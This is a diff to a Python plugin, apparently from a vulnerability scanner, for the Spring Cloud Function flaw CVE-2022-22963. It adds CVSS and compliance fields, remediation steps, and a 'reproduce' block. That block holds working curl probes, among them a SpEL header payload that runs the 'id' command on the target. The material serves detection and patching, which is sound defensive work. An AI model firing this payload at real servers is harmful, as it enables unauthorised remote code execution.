@@ -16,9 +16,39 @@ class SpringCloudFunctionRcePlugin(PluginBase):
     name = 'CVE-2022-22963 Spring Cloud Function 远程代码执行'
     cve = 'CVE-2022-22963'
     severity = 'high'
+    # D12：CVSS v3.1 + 合规映射
+    cvss_vector = 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
+    compliance = '等保2.0:8.1.3;OWASP:A03:2021'
     category = 'vuln'
     description = 'HTTP 请求头 routing-expression 注入 SpEL 求值，可执行任意命令（Cloud Function 3.x）'
     fix = '升级 Spring Cloud Function 至 3.1.7+ / 3.2.3+；或禁用路由功能'
+    fix_detail = (
+        '【升级方案】pom.xml 升级 Spring Cloud Function：\n'
+        '  3.1.x -> 3.1.7+\n'
+        '  3.2.x -> 3.2.3+\n'
+        '【配置加固】application.yml 禁用动态路由功能：\n'
+        '  spring.cloud.function.routing.enabled: false  # 禁用动态路由\n'
+        '【代码修复】自定义 FunctionConfiguration，移除 routing-expression 请求头解析\n'
+        '【WAF 规则】拦截请求头 spring.cloud.function.routing-expression\n'
+        '【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 安全审计机制'
+    )
+    reproduce = (
+        '# 1. 探测 functionRouter 端点可达性：\n'
+        'curl -i -X POST "http://target/functionRouter" -d "test"\n'
+        '\n'
+        '# 2. SpEL 表达式注入探测（7*7=49）：\n'
+        'curl -X POST "http://target/functionRouter" \\\n'
+        '  -H "spring.cloud.function.routing-expression: T(java.lang.String).valueOf(7*7)" \\\n'
+        '  -d "probe"\n'
+        '  # 返回 49 即 SpEL 求值成功\n'
+        '\n'
+        '# 3. 命令执行 PoC（id 命令回显，请勿对未授权目标使用）：\n'
+        'curl -X POST "http://target/functionRouter" \\\n'
+        '  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\\"id\\")" \\\n'
+        '  -d "probe"\n'
+        '\n'
+        '# 预期响应：POST 返回 200 + SpEL 求值结果（如 49 或命令回显）即漏洞存在'
+    )
 
     def verify(self, target, session):
         url = join_url(target, '/functionRouter')
